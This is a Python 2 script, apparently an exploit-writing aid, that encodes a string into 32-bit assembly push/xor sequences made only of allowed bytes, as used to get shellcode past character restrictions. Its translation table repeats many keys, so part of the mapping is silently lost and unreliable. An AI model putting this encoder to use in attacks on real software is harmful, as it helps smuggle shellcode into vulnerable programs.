#!/usr/bin/env python
import sys

allowed = [
                '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', 
                '\x09', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', 
                '\x38', '\x39', '\x3b', '\x3c', '\x3d', '\x3e', '\x41', '\x42', 
                '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', 
                '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', 
                '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', 
                '\x5b', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', 
                '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', 
                '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', 
                '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', 
                '\x7b', '\x7c', '\x7d', '\x7e', '\x7f'
            ]

repl =    {
                '\xc7': '\x80', '\xfc': '\x81', '\xe9': '\x82', '\xe2': '\x83',
                '\xe4': '\x84', '\xe0': '\x85', '\xe5': '\x86', '\xe7': '\x87',
                '\xea': '\x88', '\xeb': '\x89', '\xe8': '\x8a', '\xef': '\x8b',
                '\xee': '\x8c', '\xec': '\x8d', '\xc4': '\x8e', '\xc5': '\x8f',
                '\xc9': '\x90', '\xe6': '\x91', '\xc6': '\x92', '\xf4': '\x93',
                '\xf6': '\x94', '\xf2': '\x95', '\xfb': '\x96', '\xf9': '\x97',
                '\xff': '\x98', '\xd6': '\x99', '\xdc': '\x9a', '\xa2': '\x9b',
                '\xa3': '\x9c', '\xa5': '\x9d', '\x50': '\x9e', '\x83': '\x9f',
                '\xe1': '\xa0', '\xed': '\xa1', '\xf3': '\xa2', '\xfa': '\xa3',
                '\xf1': '\xa4', '\xd1': '\xa5', '\xaa': '\xa6', '\xba': '\xa7',
                '\xbf': '\xa8', '\xac': '\xa9', '\xac': '\xaa', '\xbd': '\xab',
                '\xbc': '\xac', '\xa1': '\xad', '\xab': '\xae', '\xbb': '\xaf',
                '\xa6': '\xb0', '\xa6': '\xb1', '\xa6': '\xb2', '\xa6': '\xb3',
                '\xa6': '\xb4', '\xa6': '\xb5', '\xa6': '\xb6', '\x2b': '\xb7',
                '\x2b': '\xb8', '\xa6': '\xb9', '\xa6': '\xba', '\x2b': '\xbb',
                '\x2b': '\xbc', '\x2b': '\xbd', '\x2b': '\xbe', '\x2b': '\xbf',
                '\x2b': '\xc0', '\x2d': '\xc1', '\x2d': '\xc2', '\x2b': '\xc3',
                '\x2d': '\xc4', '\x2b': '\xc5', '\xa6': '\xc6', '\xa6': '\xc7',
                '\x2b': '\xc8', '\x2b': '\xc9', '\x2d': '\xca', '\x2d': '\xcb',
                '\xa6': '\xcc', '\x2d': '\xcd', '\x2b': '\xce', '\x2d': '\xcf',
                '\x2d': '\xd0', '\x2d': '\xd1', '\x2d': '\xd2', '\x2b': '\xd3',
                '\x2b': '\xd4', '\x2b': '\xd5', '\x2b': '\xd6', '\x2b': '\xd7',
                '\x2b': '\xd8', '\x2b': '\xd9', '\x2b': '\xda', '\xa6': '\xdb',
                '\x5f': '\xdc', '\xa6': '\xdd', '\xa6': '\xde', '\xaf': '\xdf',
                '\x61': '\xe0', '\xdf': '\xe1', '\x47': '\xe2', '\x70': '\xe3',
                '\x53': '\xe4', '\x73': '\xe5', '\xb5': '\xe6', '\x74': '\xe7',
                '\x46': '\xe8', '\x54': '\xe9', '\x4f': '\xea', '\x64': '\xeb',
                '\x38': '\xec', '\x66': '\xed', '\x65': '\xee', '\x6e': '\xef',
                '\x3d': '\xf0', '\xb1': '\xf1', '\x3d': '\xf2', '\x3d': '\xf3',
                '\x28': '\xf4', '\x29': '\xf5', '\xf7': '\xf6', '\x98': '\xf7',
                '\xb0': '\xf8', '\xb7': '\xf9', '\xb7': '\xfa', '\x76': '\xfb',
                '\x6e': '\xfc', '\xb2': '\xfd', '\xa6': '\xfe', '\xa0': '\xff',
                '\x00': '\x42'
         }

a_int = [ord(n) for n in allowed]
r_int = { ord(k): ord(v) for (k, v) in repl.items() }
c_int = a_int + r_int.keys()

def findCombo(group):
    global c_int, r_int

    need = not all([ (int(group[i:i+2], 16) in c_int) for i in range(0, len(group), 2) ])

    dword = int(group, 16)
    matches = []
    for x in range(0, 4):
        byte = dword % 256

        if need:
            found = False
            for i in [(f1, f2) for f1 in c_int for f2 in c_int]:
                if not found and (i[0] ^ i[1]) == byte:
                    found = True
                    l = []
                    for j in i:
                        if j in r_int:
                            l.append(r_int[j])
                        else:
                            l.append(j)
                    matches.append(tuple(l))
        else:
            if byte in r_int:
                matches.append("{:02x}".format(r_int[byte]))
            else:
                matches.append("{:02x}".format(byte))
                
        dword >>= 8
    if need:
        return ["".join(["{:02x}".format(j) for j in list(i)]) for i in zip(*matches[::-1])]
    else:
        return [ "".join(matches[::-1]) ]

def main():
    if len(sys.argv) != 2:
        print "error"
        return 1

    args = ["{:02x}".format(ord(a)) for a in sys.argv[1][::-1]]
    chars = [args[i * 4:(i + 1) * 4] for i in range((len(args) + 4 - 1) // 4 )] 
    chars = ["".join(c) for c in chars]

    print("[BITS 32]")
    for group in chars:
        f = findCombo(group)
        if len(f) > 1:
            print("push 0x{0}".format(f[0]))
            print("pop eax")
            print("xor  eax, 0x{0}".format(f[1]))
            print("push eax")
        else:
            print("push 0x{0}".format(f[0]))
            
    print("push 0x42424242")
    print("push 0x42424242")
    print("push 0x42424242")
    print("cwde")
    print("db 0x84")

    return 0

if __name__ == "__main__":
    sys.exit(main())
